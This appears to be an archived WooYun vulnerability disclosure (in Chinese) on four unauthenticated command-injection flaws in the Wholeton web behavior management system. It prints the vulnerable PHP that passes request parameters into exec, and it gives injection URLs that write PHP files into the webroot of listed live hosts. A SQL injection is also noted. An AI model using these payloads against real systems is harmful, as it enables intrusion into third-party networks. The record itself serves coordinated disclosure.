{"id": 23890, "wybug_id": "wooyun-2015-0103676", "wybug_title": "惠尔顿上网行为管理系统命令执行四处（无需登录）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2015-03-26 11:32", "wybug_open_date": "2015-06-29 08:36", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向公众公开  简要描述： 捡pandas牛剩下的，惠尔顿上网行为管理系统命令执行四处（无需登录） 详细说明：  官网经典案例：http://www.wholeton.com/Anli.php 外网部分实际案例：\n1.https://test.bescar.com2.https://angelic.com.cn/3.http://222.223.56.1164.https://222.92.15.1005.http://111.206.133.4/6.http://mail.hualiu.cc/\n第一处命令执行文件/base/tpl/delectSSLL.php\n<?php $ssl_dir = \"/usr/local/WholetonTM/triton/conf/URL/ssl/\";$id =$_REQUEST['id'];exec (\"rm \".$ssl_dir.$id);ECHO \"rm \".$ssl_dir.$id;?>\n这里id可控，直接进入exec执行第二处命令执行：文件/base/vpn/download_nodes.php\n<?php \t$upload_dir = str_replace(\";\", \"\", $_REQUEST['file']);\t$upload_file = \"nodes\";\t$fp   =   fopen($upload_dir.$upload_file, \"r \");   \tHeader( \"Content-type:   application/octet-stream \"); \tHeader( \"Accept-Ranges:   bytes \"); \tHeader( \"Accept-Length:   \".filesize($upload_dir.$upload_file)); \tHeader( \"Content-Disposition:   attachment;   filename=\".$upload_file); \techo   fread($fp,filesize($upload_dir.$upload_file)); \tfclose($fp); \texec(\"rm \".$upload_dir.$upload_file);exit;?>\n变量upload_dir可控，而且还进行了过滤，但是不影响第三处命令执行：文件/base/tpl/delectSSL.php\n<?php\t$thisfile = basename($_SERVER['PHP_SELF']);\t$RootDir = $_SERVER[\"DOCUMENT_ROOT\"].'/base/';\tinclude_once \"$RootDir/include/gblinclude.php\";\t$ssl_dir = \"/usr/local/WholetonTM/triton/conf/URL/ssl/\";\t$id = urldecode($_REQUEST['id']);\texec (\"rm \".$ssl_dir.$id);\t$sql = \"select domain,Id from tb_ssl_policy where domain like '%$id%'\";\t$dataList = $gblDBConnect->getAll($sql);\tif(is_array($dataList)){\t\tforeach($dataList as $obj){\t\t\t$new_domain = array();\t\t\t$new_domain1= '';\t\t\t$domain = explode(\"::\",$obj->domain);\t\t\tif(count($domain)>0){\t\t\t\tfor($d = 0;$d<count($domain);$d++){\t\t\t\t\tif($domain[$d]!=trim($id)){\t\t\t\t\t\t$new_domain[] = $domain[$d];\t\t\t\t\t}\t\t\t\t}\t\t\t\t$new_domain1 = implode(\"::\",$new_domain);\t\t\t}\t\t\t$update_policy = \"update tb_ssl_policy set domain='\".$new_domain1.\"' where Id=\".$obj->Id;\t\t\t$gblDBConnect->execute($update_policy);\t\t}\t}?>\n此处某些版本需要登陆，有些版本不需要登录参数id可控而且id参数还造成SQL注入漏洞第四处命令执行：文件/base/user/clearScreenImg.php\n<?php \t$thisfile = basename($_SERVER['PHP_SELF']);\t$RootDir = $_SERVER[\"DOCUMENT_ROOT\"].'/base/';\tinclude_once \"$RootDir/include/gblinclude.php\";\t$user = $_REQUEST['user']?$_REQUEST['user']:\"*\";\texec(\"rm -rf /opt/triton/client_screen/\".$user);?>\n参数user可控   漏洞证明：  这一次换一个案例证明：以案例：http://222.223.56.116为例第一处证明：\nhttps://test.bescar.com/base/tpl/delectSSLL.php?id=;echo '333333'>/usr/local/WholetonTM/htdocs/333333.php\n\n\n第二处证明：\nhttps://test.bescar.com/base/vpn/download_nodes.php?file=123|echo '444444'>/usr/local/WholetonTM/htdocs/444444.php|\n\n\n第三处和第四处都一样，直接拼接命令即可。   修复方案：  重写。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-31 08:34 厂商回复： CNVD确认并复现所述情况,已经由CNVD直接向软件生产厂商_深圳惠尔顿公司电话和邮件通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-26 13:31 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  你就不能留点rank给后人刷吗？看xk提漏洞总是能想到电鱼那种灭绝性的捕鱼方式，一电死一片，鱼苗都不留。    \n     2015-03-26 13:37 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @pandas 你要让他痛的厉害了，他才会看医生的    \n     2015-06-29 09:17 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 南无阿弥陀佛！)\t\t \n  收藏！！！    \n     2015-07-04 09:41 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  简单的洞洞    \n     2015-07-14 17:41 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  鱼苗都不留……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}